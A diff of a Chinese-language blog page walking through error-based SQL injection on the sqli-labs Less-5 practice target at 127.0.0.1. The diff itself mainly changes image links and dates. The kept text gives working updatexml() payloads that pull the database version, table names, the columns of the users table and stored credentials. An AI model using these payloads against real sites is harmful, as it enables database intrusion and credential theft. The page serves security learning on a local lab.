@@ -28,25 +28,25 @@
 <meta property="og:site_name" content="kilig&#39;s Blog">
 <meta property="og:description" content="SQL注入-报错注入 利用场景当页面没有正确的返回错误信息时，就可以利用报错注入 原理利用数据库中的个别函数进行报错使用 常见函数updatexml() extractvalue()  extractvalue() extractvalue() :对XML文档进行查询的函数 语法：extractvalue(目标xml文档，xml路径) 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408150559699.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408150633356.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408150839219.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408150956944.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408151013948.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408151212291.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152319301.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152332281.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152601678.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152622819.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152635212.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408152645195.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408154022268.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210408154059558.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010253.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010255.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010265.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010368.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010369.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010380.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010390.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010491.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130104100.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130104101.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130104102.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130105103.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130105108.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-12-Chinese%5C20241017130105110.png">
 <meta property="article:published_time" content="2022-11-09T09:17:08.000Z">
-<meta property="article:modified_time" content="2023-03-07T15:26:14.669Z">
+<meta property="article:modified_time" content="2024-10-17T05:01:05.699Z">
 <meta property="article:author" content="kiligwh">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210408150559699.png">
+<meta name="twitter:image" content="http://example.com/Image%5CSQL-12-Chinese%5C2024101713010253.png">
 
 
 <link rel="canonical" href="http://example.com/2022/11/09/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
@@ -250,24 +250,24 @@
 <p>updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)</p>
 <p>实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候他其实已经执行了那个子查询代码</p>
 <h2 id="其他所用函数"><a href="#其他所用函数" class="headerlink" title="其他所用函数"></a>其他所用函数</h2><p>concat() &#x3D;&#x3D;&gt;将多个字符串连接成一个字符串</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210408150559699.png" alt="在这里插入图片描述"><br>2、使用反斜杠\进行探测，报出错误信息<br><img src="https://img-blog.csdnimg.cn/20210408150633356.png" alt="在这里插入图片描述"></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="/Image%5CSQL-12-Chinese%5C2024101713010253.png" alt="在这里插入图片描述"><br>2、使用反斜杠\进行探测，报出错误信息<br><img src="/Image%5CSQL-12-Chinese%5C2024101713010255.png" alt="在这里插入图片描述"></p>
 <p>3、分析报错</p>
 <figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; ==&gt;&#x27;</span><span class="number">1</span><span class="string">\&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span>  ==&gt;猜测变量由单引号包裹</span><br><span class="line">故构造payload  <span class="number">1</span><span class="string">&#x27; -- q</span></span><br></pre></td></tr></table></figure>
 
-<p>4、写入payload，页面正常<br><img src="https://img-blog.csdnimg.cn/20210408150839219.png" alt="在这里插入图片描述"></p>
-<p>5、得到字段数3，观察到页面没有回显点，但是有报错信息<br><img src="https://img-blog.csdnimg.cn/20210408150956944.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408151013948.png" alt="在这里插入图片描述"></p>
+<p>4、写入payload，页面正常<br><img src="/Image%5CSQL-12-Chinese%5C2024101713010265.png" alt="在这里插入图片描述"></p>
+<p>5、得到字段数3，观察到页面没有回显点，但是有报错信息<br><img src="/Image%5CSQL-12-Chinese%5C2024101713010368.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-12-Chinese%5C2024101713010369.png" alt="在这里插入图片描述"></p>
 <p>6、可利用updatexml()函数</p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造payload：<span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">version</span>(),<span class="number">0</span>x7e),<span class="number">1</span>)</span><br><span class="line">注意MySQL支持<span class="number">16</span>进制编码</span><br><span class="line">http:<span class="comment">//127.0.0.1/sqli/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,version(),0x7e),1)-- q</span></span><br><span class="line">得出版本号 <span class="number">5.0</span>以上</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210408151212291.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-12-Chinese%5C2024101713010380.png" alt="在这里插入图片描述"></p>
 <p>7、利用MySQL自带数据库information_schema</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and</span><br><span class="line"> updatexml(1,concat(0x7e,(select table_name from information_schema.tables where </span><br><span class="line"> table_schema=database() limit 0,1),0x7e),1) -- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210408152319301.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152332281.png" alt="在这里插入图片描述"><br>8、查看users表中的字段名</p>
+<p><img src="/Image%5CSQL-12-Chinese%5C2024101713010390.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-12-Chinese%5C2024101713010491.png" alt="在这里插入图片描述"><br>8、查看users表中的字段名</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/sqli/Less-<span class="number">5</span>/?id=<span class="number">1</span>&#x27; and updatexml(<span class="number">1</span>,</span><br><span class="line"><span class="attribute">concat</span>(<span class="number">0</span>x7e,(select column_name from information_schema.columns where</span><br><span class="line"> <span class="attribute">table_schema</span>=database() and table_name=&#x27;users&#x27; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>) -- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210408152601678.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152622819.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152635212.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210408152645195.png" alt="在这里插入图片描述"><br>得出users表中有三个字段名：id、username、password</p>
-<p>9、分别得出username和password 字段数据<br>第一个username字段数据Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154022268.png" alt="在这里插入图片描述"><br>第一个password字段数据：Dumb<br><img src="https://img-blog.csdnimg.cn/20210408154059558.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-12-Chinese%5C20241017130104100.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-12-Chinese%5C20241017130104101.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-12-Chinese%5C20241017130104102.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-12-Chinese%5C20241017130105103.png" alt="在这里插入图片描述"><br>得出users表中有三个字段名：id、username、password</p>
+<p>9、分别得出username和password 字段数据<br>第一个username字段数据Dumb<br><img src="/Image%5CSQL-12-Chinese%5C20241017130105108.png" alt="在这里插入图片描述"><br>第一个password字段数据：Dumb<br><img src="/Image%5CSQL-12-Chinese%5C20241017130105110.png" alt="在这里插入图片描述"></p>
 
     </div>
 
@@ -309,7 +309,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
